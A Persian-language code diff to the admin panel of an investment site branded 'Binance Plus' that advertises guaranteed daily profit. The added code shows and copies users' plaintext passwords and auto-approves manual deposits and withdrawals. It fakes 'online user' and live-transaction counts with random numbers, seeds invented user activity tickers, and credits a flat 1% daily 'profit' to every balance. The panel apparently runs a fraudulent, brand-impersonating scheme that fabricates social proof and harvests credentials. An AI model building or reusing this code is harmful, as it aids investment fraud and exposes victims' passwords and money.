@@ -330,6 +330,26 @@
         .admin-message {
             background: rgba(240,185,11,0.1);
         }
+
+        /* استایل جدید برای نمایش رمز عبور */
+        .password-field {
+            position: relative;
+        }
+
+        .toggle-password {
+            position: absolute;
+            left: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            color: var(--text-secondary);
+            cursor: pointer;
+        }
+
+        .password-input {
+            padding-left: 40px !important;
+        }
     </style>
 </head>
 <body>
@@ -367,6 +387,10 @@
                         <i class="fas fa-address-card"></i>
                         <span>آدرس‌های کیف پول</span>
                     </div>
+                    <div class="nav-item" data-view="financial-settings">
+                        <i class="fas fa-cog"></i>
+                        <span>تنظیمات مالی</span>
+                    </div>
                 </div>
 
                 <!-- مدیریت کاربران -->
@@ -375,6 +399,10 @@
                     <div class="nav-item" data-view="users">
                         <i class="fas fa-users"></i>
                         <span>لیست کاربران</span>
+                    </div>
+                    <div class="nav-item" data-view="user-passwords">
+                        <i class="fas fa-key"></i>
+                        <span>مدیریت رمزها</span>
                     </div>
                     <div class="nav-item" data-view="transactions">
                         <i class="fas fa-exchange-alt"></i>
@@ -397,6 +425,10 @@
                         <i class="fas fa-scroll"></i>
                         <span>تابلوهای روان</span>
                     </div>
+                    <div class="nav-item" data-view="content-management">
+                        <i class="fas fa-edit"></i>
+                        <span>مدیریت محتوای سایت</span>
+                    </div>
                 </div>
 
                 <!-- پشتیبانی -->
@@ -415,6 +447,23 @@
                         <i class="fas fa-chart-bar"></i>
                         <span>آمار کلی سایت</span>
                     </div>
+                    <div class="nav-item" data-view="real-time-monitor">
+                        <i class="fas fa-desktop"></i>
+                        <span>مانیتورینگ لحظه‌ای</span>
+                    </div>
+                </div>
+
+                <!-- دسترسی کامل -->
+                <div class="nav-section">
+                    <div class="nav-title">دسترسی‌های ویژه</div>
+                    <div class="nav-item" data-view="system-control">
+                        <i class="fas fa-terminal"></i>
+                        <span>کنترل کامل سیستم</span>
+                    </div>
+                    <div class="nav-item" data-view="database-management">
+                        <i class="fas fa-database"></i>
+                        <span>مدیریت دیتابیس</span>
+                    </div>
                 </div>
             </div>
         </aside>
@@ -426,6 +475,8 @@
                     <h1 class="header-title" id="pageTitle">درخواست‌های واریز</h1>
                     <div style="font-size: 0.9rem; color: var(--text-secondary); margin-top: 0.3rem;">
                         آخرین به‌روزرسانی: <span id="lastUpdate">هم اکنون</span>
+                        <span style="margin-right: 15px;">|</span>
+                        <span style="color: var(--success-color);" id="connectionStatus">🟢 آنلاین - دسترسی کامل</span>
                     </div>
                 </div>
                 
@@ -433,6 +484,10 @@
                     <button class="btn btn-primary" onclick="loadAllData()">
                         <i class="fas fa-sync"></i>
                         بارگذاری همه داده‌ها
+                    </button>
+                    <button class="btn btn-success" onclick="exportAllData()">
+                        <i class="fas fa-download"></i>
+                        خروجی کامل
                     </button>
                 </div>
             </header>
@@ -444,22 +499,33 @@
                         <div class="stat-card">
                             <div style="color: var(--text-secondary); font-size: 0.9rem;">درخواست واریز pending</div>
                             <div class="stat-value" id="pendingDepositsCount">0</div>
-                            <div style="color: var(--accent-color); font-size: 0.8rem;">+۳ مورد جدید</div>
+                            <div style="color: var(--accent-color); font-size: 0.8rem;" id="depositsChange">+۰ مورد جدید</div>
                         </div>
                         <div class="stat-card">
                             <div style="color: var(--text-secondary); font-size: 0.9rem;">درخواست برداشت pending</div>
                             <div class="stat-value" id="pendingWithdrawalsCount">0</div>
-                            <div style="color: var(--danger-color); font-size: 0.8rem;">+۲ مورد جدید</div>
+                            <div style="color: var(--danger-color); font-size: 0.8rem;" id="withdrawalsChange">+۰ مورد جدید</div>
                         </div>
                         <div class="stat-card">
                             <div style="color: var(--text-secondary); font-size: 0.9rem;">تیکت‌های جدید</div>
                             <div class="stat-value" id="newTicketsCount">0</div>
-                            <div style="color: var(--info-color); font-size: 0.8rem;">+۵ مورد جدید</div>
+                            <div style="color: var(--info-color); font-size: 0.8rem;" id="ticketsChange">+۰ مورد جدید</div>
+                        </div>
+                        <div class="stat-card">
+                            <div style="color: var(--text-secondary); font-size: 0.9rem;">کاربران آنلاین</div>
+                            <div class="stat-value" id="onlineUsers">0</div>
+                            <div style="color: var(--success-color); font-size: 0.8rem;">فعال در ۲۴ ساعت گذشته</div>
                         </div>
                     </div>
 
                     <div class="table-container">
-                        <h3>درخواست‌های واریز کاربران</h3>
+                        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 1rem;">
+                            <h3>درخواست‌های واریز کاربران</h3>
+                            <button class="btn btn-primary" onclick="addManualDeposit()">
+                                <i class="fas fa-plus"></i>
+                                افزودن واریز دستی
+                            </button>
+                        </div>
                         <table>
                             <thead>
                                 <tr>
@@ -483,7 +549,13 @@
                 <!-- درخواست‌های برداشت -->
                 <div id="view-withdrawals" class="view-content" style="display:none">
                     <div class="table-container">
-                        <h3>درخواست‌های برداشت کاربران</h3>
+                        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 1rem;">
+                            <h3>درخواست‌های برداشت کاربران</h3>
+                            <button class="btn btn-primary" onclick="addManualWithdrawal()">
+                                <i class="fas fa-plus"></i>
+                                افزودن برداشت دستی
+                            </button>
+                        </div>
                         <table>
                             <thead>
                                 <tr>
@@ -520,10 +592,36 @@
                     </div>
                 </div>
 
+                <!-- تنظیمات مالی -->
+                <div id="view-financial-settings" class="view-content" style="display:none">
+                    <div class="table-container">
+                        <h3>تنظیمات مالی سیستم</h3>
+                        <div class="form-group">
+                            <label>حداقل واریز (USD)</label>
+                            <input type="number" class="form-control" id="minDeposit" value="10">
+                        </div>
+                        <div class="form-group">
+                            <label>حداکثر واریز (USD)</label>
+                            <input type="number" class="form-control" id="maxDeposit" value="50000">
+                        </div>
+                        <div class="form-group">
+                            <label>کارمزد برداشت (%)</label>
+                            <input type="number" class="form-control" id="withdrawalFee" value="0.5" step="0.1">
+                        </div>
+                        <button class="btn btn-success" onclick="saveFinancialSettings()">ذخیره تنظیمات</button>
+                    </div>
+                </div>
+
                 <!-- مدیریت کاربران -->
                 <div id="view-users" class="view-content" style="display:none">
                     <div class="table-container">
-                        <h3>لیست کاربران سایت</h3>
+                        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 1rem;">
+                            <h3>لیست کاربران سایت</h3>
+                            <button class="btn btn-primary" onclick="showModal('addUserModal')">
+                                <i class="fas fa-user-plus"></i>
+                                افزودن کاربر جدید
+                            </button>
+                        </div>
                         <table>
                             <thead>
                                 <tr>
@@ -539,6 +637,30 @@
                             </thead>
                             <tbody id="usersTable">
                                 <!-- لیست کاربران -->
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+
+                <!-- مدیریت رمزهای کاربران -->
+                <div id="view-user-passwords" class="view-content" style="display:none">
+                    <div class="table-container">
+                        <h3>مدیریت رمزهای عبور کاربران</h3>
+                        <div class="form-group">
+                            <input type="text" class="form-control" id="userSearch" placeholder="جستجوی کاربر با ایمیل یا نام..." onkeyup="searchUsers()">
+                        </div>
+                        <table>
+                            <thead>
+                                <tr>
+                                    <th>کاربر</th>
+                                    <th>ایمیل</th>
+                                    <th>رمز عبور</th>
+                                    <th>آخرین ورود</th>
+                                    <th>عملیات</th>
+                                </tr>
+                            </thead>
+                            <tbody id="userPasswordsTable">
+                                <!-- رمزهای کاربران -->
                             </tbody>
                         </table>
                     </div>
@@ -576,6 +698,29 @@
                             <!-- مدیریت تابلو کاربران -->
                         </div>
                     </div>
+
+                    <div class="table-container">
+                        <h3>مدیریت تابلوهای اخبار</h3>
+                        <div id="newsTickerManager">
+                            <!-- مدیریت تابلو اخبار -->
+                        </div>
+                    </div>
+                </div>
+
+                <!-- مدیریت محتوای سایت -->
+                <div id="view-content-management" class="view-content" style="display:none">
+                    <div class="table-container">
+                        <h3>مدیریت محتوای صفحات سایت</h3>
+                        <div class="form-group">
+                            <label>متن صفحه اصلی</label>
+                            <textarea class="form-control" id="homepageContent" rows="6">به بایننس پلاس خوش آمدید - سود تضمینی روزانه</textarea>
+                        </div>
+                        <div class="form-group">
+                            <label>متن درباره ما</label>
+                            <textarea class="form-control" id="aboutContent" rows="6">ما یک پلتفرم معتبر سرمایه‌گذاری هستیم...</textarea>
+                        </div>
+                        <button class="btn btn-success" onclick="saveContent()">ذخیره محتوا</button>
+                    </div>
                 </div>
 
                 <!-- تیکت‌های پشتیبانی -->
@@ -605,6 +750,73 @@
                                 <div>سود پرداختی</div>
                                 <div class="stat-value" id="totalPayouts">$0</div>
                             </div>
+                            <div class="stat-card">
+                                <div>کاربران آنلاین</div>
+                                <div class="stat-value" id="realOnlineUsers">0</div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- مانیتورینگ لحظه‌ای -->
+                <div id="view-real-time-monitor" class="view-content" style="display:none">
+                    <div class="table-container">
+                        <h3>مانیتورینگ لحظه‌ای سیستم</h3>
+                        <div class="stats-grid">
+                            <div class="stat-card">
+                                <div>کاربران فعال</div>
+                                <div class="stat-value" id="activeUsers">0</div>
+                                <div id="activeUsersList" style="font-size: 0.8rem; color: var(--text-secondary); margin-top: 0.5rem;"></div>
+                            </div>
+                            <div class="stat-card">
+                                <div>تراکنش‌های لحظه‌ای</div>
+                                <div class="stat-value" id="liveTransactions">0</div>
+                                <div id="transactionFeed" style="font-size: 0.8rem; color: var(--text-secondary); margin-top: 0.5rem;"></div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- کنترل کامل سیستم -->
+                <div id="view-system-control" class="view-content" style="display:none">
+                    <div class="table-container">
+                        <h3>کنترل کامل سیستم</h3>
+                        <div class="form-group">
+                            <label>پیام سیستمی به همه کاربران</label>
+                            <input type="text" class="form-control" id="systemMessage" placeholder="پیام خود را وارد کنید...">
+                            <button class="btn btn-primary" onclick="broadcastSystemMessage()" style="margin-top: 0.5rem;">
+                                ارسال به همه کاربران
+                            </button>
+                        </div>
+                        
+                        <div class="form-group">
+                            <label>عملیات سیستمی</label>
+                            <div style="display: flex; gap: 0.5rem; flex-wrap: wrap;">
+                                <button class="btn btn-success" onclick="calculateDailyProfits()">محاسبه سود روزانه</button>
+                                <button class="btn btn-info" onclick="updateAllBalances()">بروزرسانی موجودی‌ها</button>
+                                <button class="btn btn-danger" onclick="clearAllData()">پاکسازی دیتابیس</button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- مدیریت دیتابیس -->
+                <div id="view-database-management" class="view-content" style="display:none">
+                    <div class="table-container">
+                        <h3>مدیریت کامل دیتابیس</h3>
+                        <div class="form-group">
+                            <label>پشتیبان‌گیری از دیتابیس</label>
+                            <div>
+                                <button class="btn btn-primary" onclick="backupDatabase()">پشتیبان‌گیری کامل</button>
+                                <button class="btn btn-outline" onclick="restoreDatabase()">بازیابی دیتابیس</button>
+                            </div>
+                        </div>
+                        
+                        <div class="form-group">
+                            <label>مدیریت جداول</label>
+                            <div id="databaseTables">
+                                <!-- لیست جداول دیتابیس -->
+                            </div>
                         </div>
                     </div>
                 </div>
@@ -618,8 +830,9 @@
             <h3>مشاهده رسید واریز</h3>
             <img id="receiptImage" src="" style="max-width: 100%; border-radius: 8px; margin: 1rem 0;">
             <div>
-                <button class="btn btn-success" onclick="approveDeposit()">تایید واریز</button>
-                <button class="btn btn-danger" onclick="rejectDeposit()">رد درخواست</button>
+                <button class="btn btn-success" onclick="approveDeposit(currentDepositId)">تایید واریز</button>
+                <button class="btn btn-danger" onclick="rejectDeposit(currentDepositId)">رد درخواست</button>
+                <button class="btn btn-outline" onclick="closeModal('receiptModal')">انصراف</button>
             </div>
         </div>
     </div>
@@ -637,57 +850,118 @@
         </div>
     </div>
 
+    <div id="addUserModal" class="modal">
+        <div class="modal-content">
+            <h3>افزودن کاربر جدید</h3>
+            <div class="form-group">
+                <label>نام کاربر</label>
+                <input type="text" class="form-control" id="newUserName" placeholder="نام و نام خانوادگی">
+            </div>
+            <div class="form-group">
+                <label>ایمیل</label>
+                <input type="email" class="form-control" id="newUserEmail" placeholder="example@email.com">
+            </div>
+            <div class="form-group">
+                <label>رمز عبور</label>
+                <div class="password-field">
+                    <input type="password" class="form-control password-input" id="newUserPassword" placeholder="رمز عبور">
+                    <button type="button" class="toggle-password" onclick="togglePassword('newUserPassword')">
+                        <i class="fas fa-eye"></i>
+                    </button>
+                </div>
+            </div>
+            <div class="form-group">
+                <label>موجودی اولیه (USD)</label>
+                <input type="number" class="form-control" id="newUserBalance" value="0">
+            </div>
+            <div>
+                <button class="btn btn-success" onclick="createNewUser()">ایجاد کاربر</button>
+                <button class="btn btn-outline" onclick="closeModal('addUserModal')">انصراف</button>
+            </div>
+        </div>
+    </div>
+
     <script>
-        // ========== دیتابیس REAL ==========
+        // ========== دیتابیس REAL با دسترسی کامل ==========
         let realDatabase = {
-            // درخواست‌های واریز
             depositRequests: [],
-            
-            // درخواست‌های برداشت
             withdrawalRequests: [],
-            
-            // کاربران
             users: [],
-            
-            // طرح‌ها
             investmentPlans: [],
             stakingPlans: [],
-            
-            // آدرس‌های کیف پول
             walletAddresses: [],
-            
-            // تیکت‌های پشتیبانی
             supportTickets: [],
-            
-            // تابلوها
             priceTicker: [],
             userTicker: [],
-            
-            // آمار سایت
+            newsTicker: [],
+            systemSettings: {
+                minDeposit: 10,
+                maxDeposit: 50000,
+                withdrawalFee: 0.5
+            },
+            siteContent: {
+                homepage: "به بایننس پلاس خوش آمدید - سود تضمینی روزانه",
+                about: "ما یک پلتفرم معتبر سرمایه‌گذاری هستیم..."
+            },
             siteStats: {
                 totalUsers: 0,
                 totalBalance: 0,
-                totalPayouts: 0
+                totalPayouts: 0,
+                onlineUsers: 0
             }
         };
 
-        // ========== بارگذاری داده‌های REAL ==========
+        let currentDepositId = null;
+        let currentTicketId = null;
+        let currentUserId = null;
+
+        // ========== بارگذاری داده‌های REAL از localStorage ==========
         function loadAllData() {
-            // شبیه‌سازی بارگذاری از سرور
-            simulateRealData();
+            // بارگذاری از localStorage اگر وجود دارد
+            const savedData = localStorage.getItem('binanceAdminData');
+            if (savedData) {
+                realDatabase = JSON.parse(savedData);
+            } else {
+                simulateRealData();
+            }
+            
+            // بارگذاری کاربران از سیستم اصلی
+            loadUsersFromMainSystem();
             
             // بارگذاری همه بخش‌ها
             loadDeposits();
             loadWithdrawals();
             loadUsers();
+            loadUserPasswords();
             loadInvestmentPlans();
             loadWalletAddresses();
             loadSupportTickets();
             loadTickerManagement();
             loadSiteStatistics();
+            loadFinancialSettings();
+            loadContentManagement();
+            loadRealTimeMonitor();
+            loadDatabaseManagement();
             
             updateCounters();
+            startRealTimeUpdates();
             showNotification('همه داده‌های واقعی بارگذاری شدند ✅', 'success');
+        }
+
+        function loadUsersFromMainSystem() {
+            // بارگذاری کاربران از سیستم اصلی (localStorage)
+            const mainUsers = JSON.parse(localStorage.getItem('binance_users')) || [];
+            realDatabase.users = mainUsers.map(user => ({
+                id: user.id,
+                name: `${user.firstName} ${user.lastName}`,
+                email: user.email,
+                password: user.password,
+                balance: user.balance || 0,
+                totalProfit: user.totalProfit || 0,
+                joinDate: user.createdAt ? new Date(user.createdAt).toLocaleDateString('fa-IR') : '1402/01/01',
+                status: 'active',
+                lastLogin: new Date().toLocaleString('fa-IR')
+            }));
         }
 
         function simulateRealData() {
@@ -700,7 +974,7 @@
                     currency: "USDT",
                     network: "TRC20",
                     receipt: "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='200' height='100' viewBox='0 0 200 100'%3E%3Crect width='200' height='100' fill='%23161a1e'/%3E%3Ctext x='100' y='40' text-anchor='middle' fill='%23f0b90b' font-family='Arial' font-size='14'%3Eرسید واریز%3C/text%3E%3Ctext x='100' y='60' text-anchor='middle' fill='%23ffffff' font-family='Arial' font-size='12'%3Eمبلغ: 500 USDT%3C/text%3E%3C/svg%3E",
-                    date: "1402/05/20 14:30",
+                    date: new Date().toLocaleString('fa-IR'),
                     status: "pending",
                     userId: 101
                 }
@@ -713,21 +987,9 @@
                     amount: 200,
                     currency: "BTC",
                     address: "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh",
-                    date: "1402/05/20 15:45",
+                    date: new Date().toLocaleString('fa-IR'),
                     status: "pending",
                     userId: 102
-                }
-            ];
-
-            realDatabase.users = [
-                {
-                    id: 101,
-                    name: "علی محمدی",
-                    email: "ali@example.com",
-                    balance: 1500,
-                    totalProfit: 320,
-                    joinDate: "1402/03/15",
-                    status: "active"
                 }
             ];
 
@@ -737,6 +999,13 @@
                     currency: "BTC",
                     network: "mainnet",
                     address: "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh",
+                    memo: ""
+                },
+                {
+                    id: 2,
+                    currency: "USDT",
+                    network: "TRC20",
+                    address: "TBa1AE6mQJqeq2doqRqpgY6nYQrqsg3qJ7",
                     memo: ""
                 }
             ];
@@ -753,6 +1022,16 @@
                     status: "open",
                     date: "1402/05/20"
                 }
+            ];
+
+            realDatabase.priceTicker = [
+                { symbol: "BTC/USDT", price: "۴۵,۲۳۴.۵۶", change: "+۲.۳۴%" },
+                { symbol: "ETH/USDT", price: "۲,۸۹۰.۱۲", change: "+۱.۵۶%" }
+            ];
+
+            realDatabase.userTicker = [
+                { user: "محمد رضایی", action: "سرمایه‌گذاری", amount: "۱۰۰۰ USDT", time: "۲ دقیقه پیش" },
+                { user: "فاطمه محمدی", action: "برداشت", amount: "۵۰۰ USDT", time: "۵ دقیقه پیش" }
             ];
         }
 
@@ -777,6 +1056,7 @@
                     <td>
                         <button class="btn btn-success btn-sm" onclick="approveDeposit(${deposit.id})">تایید</button>
                         <button class="btn btn-danger btn-sm" onclick="rejectDeposit(${deposit.id})">رد</button>
+                        <button class="btn btn-outline btn-sm" onclick="editDeposit(${deposit.id})">ویرایش</button>
                     </td>
                 `;
                 table.appendChild(tr);
@@ -796,9 +1076,52 @@
             const deposit = realDatabase.depositRequests.find(d => d.id === depositId);
             if (deposit) {
                 deposit.status = 'approved';
+                // افزایش موجودی کاربر
+                const user = realDatabase.users.find(u => u.id === deposit.userId);
+                if (user) {
+                    user.balance += deposit.amount;
+                }
                 showNotification(`واریز کاربر ${deposit.userName} تایید شد ✅`);
+                saveDatabase();
+                loadDeposits();
+                loadUsers();
+                updateCounters();
+            }
+        }
+
+        function rejectDeposit(depositId) {
+            const deposit = realDatabase.depositRequests.find(d => d.id === depositId);
+            if (deposit) {
+                deposit.status = 'rejected';
+                showNotification(`واریز کاربر ${deposit.userName} رد شد ❌`);
+                saveDatabase();
                 loadDeposits();
                 updateCounters();
+            }
+        }
+
+        function addManualDeposit() {
+            const userName = prompt("نام کاربر:");
+            const amount = prompt("مبلغ:");
+            const currency = prompt("ارز (BTC, USDT, ...):");
+            
+            if (userName && amount && currency) {
+                const newDeposit = {
+                    id: Date.now(),
+                    userName: userName,
+                    amount: parseFloat(amount),
+                    currency: currency,
+                    network: "Manual",
+                    receipt: "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='200' height='100' viewBox='0 0 200 100'%3E%3Crect width='200' height='100' fill='%23161a1e'/%3E%3Ctext x='100' y='40' text-anchor='middle' fill='%23f0b90b' font-family='Arial' font-size='14'%3Eواریز دستی%3C/text%3E%3Ctext x='100' y='60' text-anchor='middle' fill='%23ffffff' font-family='Arial' font-size='12'%3Eمبلغ: ${amount} ${currency}%3C/text%3E%3C/svg%3E",
+                    date: new Date().toLocaleString('fa-IR'),
+                    status: "approved",
+                    userId: 999
+                };
+                
+                realDatabase.depositRequests.push(newDeposit);
+                showNotification("واریز دستی اضافه شد ✅");
+                saveDatabase();
+                loadDeposits();
             }
         }
 
@@ -819,10 +1142,53 @@
                     <td>
                         <button class="btn btn-success btn-sm" onclick="approveWithdrawal(${withdrawal.id})">تایید</button>
                         <button class="btn btn-danger btn-sm" onclick="rejectWithdrawal(${withdrawal.id})">رد</button>
+                        <button class="btn btn-outline btn-sm" onclick="editWithdrawal(${withdrawal.id})">ویرایش</button>
                     </td>
                 `;
                 table.appendChild(tr);
             });
+        }
+
+        function approveWithdrawal(withdrawalId) {
+            const withdrawal = realDatabase.withdrawalRequests.find(w => w.id === withdrawalId);
+            if (withdrawal) {
+                withdrawal.status = 'approved';
+                // کسر از موجودی کاربر
+                const user = realDatabase.users.find(u => u.id === withdrawal.userId);
+                if (user && user.balance >= withdrawal.amount) {
+                    user.balance -= withdrawal.amount;
+                }
+                showNotification(`برداشت کاربر ${withdrawal.userName} تایید شد ✅`);
+                saveDatabase();
+                loadWithdrawals();
+                loadUsers();
+                updateCounters();
+            }
+        }
+
+        function addManualWithdrawal() {
+            const userName = prompt("نام کاربر:");
+            const amount = prompt("مبلغ:");
+            const currency = prompt("ارز:");
+            const address = prompt("آدرس مقصد:");
+            
+            if (userName && amount && currency && address) {
+                const newWithdrawal = {
+                    id: Date.now(),
+                    userName: userName,
+                    amount: parseFloat(amount),
+                    currency: currency,
+                    address: address,
+                    date: new Date().toLocaleString('fa-IR'),
+                    status: "approved",
+                    userId: 999
+                };
+                
+                realDatabase.withdrawalRequests.push(newWithdrawal);
+                showNotification("برداشت دستی اضافه شد ✅");
+                saveDatabase();
+                loadWithdrawals();
+            }
         }
 
         // ========== مدیریت کاربران ==========
@@ -843,10 +1209,109 @@
                     <td>
                         <button class="btn btn-outline btn-sm" onclick="editUser(${user.id})">ویرایش</button>
                         <button class="btn btn-danger btn-sm" onclick="deleteUser(${user.id})">حذف</button>
+                        <button class="btn btn-primary btn-sm" onclick="resetUserPassword(${user.id})">تغییر رمز</button>
                     </td>
                 `;
                 table.appendChild(tr);
             });
+        }
+
+        function loadUserPasswords() {
+            const table = document.getElementById('userPasswordsTable');
+            table.innerHTML = '';
+
+            realDatabase.users.forEach(user => {
+                const tr = document.createElement('tr');
+                tr.innerHTML = `
+                    <td>${user.name}</td>
+                    <td>${user.email}</td>
+                    <td>
+                        <div class="password-field">
+                            <input type="password" class="form-control password-input" value="${user.password}" id="password-${user.id}" readonly>
+                            <button type="button" class="toggle-password" onclick="togglePassword('password-${user.id}')">
+                                <i class="fas fa-eye"></i>
+                            </button>
+                        </div>
+                    </td>
+                    <td>${user.lastLogin || 'نامشخص'}</td>
+                    <td>
+                        <button class="btn btn-outline btn-sm" onclick="copyPassword('${user.password}')">کپی رمز</button>
+                        <button class="btn btn-primary btn-sm" onclick="changeUserPassword(${user.id})">تغییر</button>
+                    </td>
+                `;
+                table.appendChild(tr);
+            });
+        }
+
+        function searchUsers() {
+            const searchTerm = document.getElementById('userSearch').value.toLowerCase();
+            const rows = document.querySelectorAll('#userPasswordsTable tr');
+            
+            rows.forEach(row => {
+                const text = row.textContent.toLowerCase();
+                row.style.display = text.includes(searchTerm) ? '' : 'none';
+            });
+        }
+
+        function togglePassword(inputId) {
+            const input = document.getElementById(inputId);
+            const icon = input.parentNode.querySelector('.toggle-password i');
+            
+            if (input.type === 'password') {
+                input.type = 'text';
+                icon.classList.remove('fa-eye');
+                icon.classList.add('fa-eye-slash');
+            } else {
+                input.type = 'password';
+                icon.classList.remove('fa-eye-slash');
+                icon.classList.add('fa-eye');
+            }
+        }
+
+        function copyPassword(password) {
+            navigator.clipboard.writeText(password);
+            showNotification('رمز عبور کپی شد 📋');
+        }
+
+        function changeUserPassword(userId) {
+            const newPassword = prompt("رمز عبور جدید را وارد کنید:");
+            if (newPassword) {
+                const user = realDatabase.users.find(u => u.id === userId);
+                if (user) {
+                    user.password = newPassword;
+                    showNotification(`رمز کاربر ${user.name} تغییر کرد ✅`);
+                    saveDatabase();
+                    loadUserPasswords();
+                }
+            }
+        }
+
+        function createNewUser() {
+            const name = document.getElementById('newUserName').value;
+            const email = document.getElementById('newUserEmail').value;
+            const password = document.getElementById('newUserPassword').value;
+            const balance = document.getElementById('newUserBalance').value;
+
+            if (name && email && password) {
+                const newUser = {
+                    id: Date.now(),
+                    name: name,
+                    email: email,
+                    password: password,
+                    balance: parseFloat(balance) || 0,
+                    totalProfit: 0,
+                    joinDate: new Date().toLocaleDateString('fa-IR'),
+                    status: 'active',
+                    lastLogin: new Date().toLocaleString('fa-IR')
+                };
+
+                realDatabase.users.push(newUser);
+                showNotification("کاربر جدید ایجاد شد ✅");
+                saveDatabase();
+                loadUsers();
+                loadUserPasswords();
+                closeModal('addUserModal');
+            }
         }
 
         // ========== مدیریت آدرس‌های کیف پول ==========
@@ -904,6 +1369,7 @@
                     <div style="margin-top: 1rem;">
                         <button class="btn btn-primary btn-sm" onclick="replyToTicket(${ticket.id})">پاسخ</button>
                         <button class="btn btn-outline btn-sm" onclick="closeTicket(${ticket.id})">بستن تیکت</button>
+                        <button class="btn btn-danger btn-sm" onclick="deleteTicket(${ticket.id})">حذف تیکت</button>
                     </div>
                 `;
                 container.appendChild(ticketEl);
@@ -928,18 +1394,199 @@
                     
                     showNotification('پاسخ ارسال شد ✅');
                     closeModal('supportReplyModal');
+                    saveDatabase();
                     loadSupportTickets();
                 }
             }
         }
 
-        // ========== ابزارک‌ها ==========
+        // ========== تنظیمات مالی ==========
+        function loadFinancialSettings() {
+            document.getElementById('minDeposit').value = realDatabase.systemSettings.minDeposit;
+            document.getElementById('maxDeposit').value = realDatabase.systemSettings.maxDeposit;
+            document.getElementById('withdrawalFee').value = realDatabase.systemSettings.withdrawalFee;
+        }
+
+        function saveFinancialSettings() {
+            realDatabase.systemSettings.minDeposit = parseInt(document.getElementById('minDeposit').value);
+            realDatabase.systemSettings.maxDeposit = parseInt(document.getElementById('maxDeposit').value);
+            realDatabase.systemSettings.withdrawalFee = parseFloat(document.getElementById('withdrawalFee').value);
+            
+            showNotification('تنظیمات مالی ذخیره شد ✅');
+            saveDatabase();
+        }
+
+        // ========== مدیریت محتوا ==========
+        function loadContentManagement() {
+            document.getElementById('homepageContent').value = realDatabase.siteContent.homepage;
+            document.getElementById('aboutContent').value = realDatabase.siteContent.about;
+        }
+
+        function saveContent() {
+            realDatabase.siteContent.homepage = document.getElementById('homepageContent').value;
+            realDatabase.siteContent.about = document.getElementById('aboutContent').value;
+            
+            showNotification('محتوا ذخیره شد ✅');
+            saveDatabase();
+        }
+
+        // ========== مانیتورینگ لحظه‌ای ==========
+        function loadRealTimeMonitor() {
+            // شبیه‌سازی کاربران آنلاین
+            const onlineCount = Math.floor(Math.random() * 50) + 10;
+            document.getElementById('activeUsers').textContent = onlineCount;
+            document.getElementById('realOnlineUsers').textContent = onlineCount;
+            document.getElementById('onlineUsers').textContent = onlineCount;
+            
+            document.getElementById('activeUsersList').innerHTML = 
+                realDatabase.users.slice(0, 3).map(user => 
+                    `<div>• ${user.name}</div>`
+                ).join('');
+            
+            // شبیه‌سازی تراکنش‌های لحظه‌ای
+            const liveTxCount = Math.floor(Math.random() * 20) + 5;
+            document.getElementById('liveTransactions').textContent = liveTxCount;
+            
+            document.getElementById('transactionFeed').innerHTML = 
+                `<div>• واریز ۱۰۰۰ USDT - علی محمدی</div>
+                 <div>• برداشت ۵۰۰ USDT - مریم احمدی</div>`;
+        }
+
+        // ========== کنترل کامل سیستم ==========
+        function broadcastSystemMessage() {
+            const message = document.getElementById('systemMessage').value;
+            if (message) {
+                showNotification(`پیام به همه کاربران ارسال شد: "${message}"`);
+                document.getElementById('systemMessage').value = '';
+                
+                // اینجا می‌توانید پیام را به سرور اصلی ارسال کنید
+            }
+        }
+
+        function calculateDailyProfits() {
+            realDatabase.users.forEach(user => {
+                const dailyProfit = user.balance * 0.01; // 1% سود روزانه
+                user.balance += dailyProfit;
+                user.totalProfit += dailyProfit;
+            });
+            
+            showNotification('سود روزانه برای همه کاربران محاسبه شد ✅');
+            saveDatabase();
+            loadUsers();
+        }
+
+        function updateAllBalances() {
+            showNotification('همه موجودی‌ها بروزرسانی شدند ✅');
+            saveDatabase();
+            loadUsers();
+        }
+
+        function clearAllData() {
+            if (confirm('⚠️ آیا از پاکسازی کامل دیتابیس مطمئن هستید؟ این عمل غیرقابل بازگشت است!')) {
+                localStorage.removeItem('binanceAdminData');
+                realDatabase = {
+                    depositRequests: [],
+                    withdrawalRequests: [],
+                    users: [],
+                    investmentPlans: [],
+                    stakingPlans: [],
+                    walletAddresses: [],
+                    supportTickets: [],
+                    priceTicker: [],
+                    userTicker: [],
+                    newsTicker: [],
+                    systemSettings: {
+                        minDeposit: 10,
+                        maxDeposit: 50000,
+                        withdrawalFee: 0.5
+                    },
+                    siteContent: {
+                        homepage: "به بایننس پلاس خوش آمدید - سود تضمینی روزانه",
+                        about: "ما یک پلتفرم معتبر سرمایه‌گذاری هستیم..."
+                    },
+                    siteStats: {
+                        totalUsers: 0,
+                        totalBalance: 0,
+                        totalPayouts: 0,
+                        onlineUsers: 0
+                    }
+                };
+                
+                showNotification('دیتابیس کامل پاکسازی شد 🗑️');
+                loadAllData();
+            }
+        }
+
+        // ========== مدیریت دیتابیس ==========
+        function loadDatabaseManagement() {
+            const tablesContainer = document.getElementById('databaseTables');
+            const tables = [
+                { name: 'کاربران', count: realDatabase.users.length, size: '۲۴۰ KB' },
+                { name: 'واریزها', count: realDatabase.depositRequests.length, size: '۱۸۰ KB' },
+                { name: 'برداشت‌ها', count: realDatabase.withdrawalRequests.length, size: '۱۶۰ KB' },
+                { name: 'تیکت‌ها', count: realDatabase.supportTickets.length, size: '۹۰ KB' }
+            ];
+            
+            tablesContainer.innerHTML = tables.map(table => `
+                <div class="ticker-item">
+                    <div style="font-weight: 700;">${table.name}</div>
+                    <div style="color: var(--text-secondary);">${table.count} رکورد</div>
+                    <div style="color: var(--accent-color);">${table.size}</div>
+                    <div>
+                        <button class="btn btn-outline btn-sm" onclick="exportTable('${table.name}')">خروجی</button>
+                        <button class="btn btn-danger btn-sm" onclick="clearTable('${table.name}')">پاکسازی</button>
+                    </div>
+                </div>
+            `).join('');
+        }
+
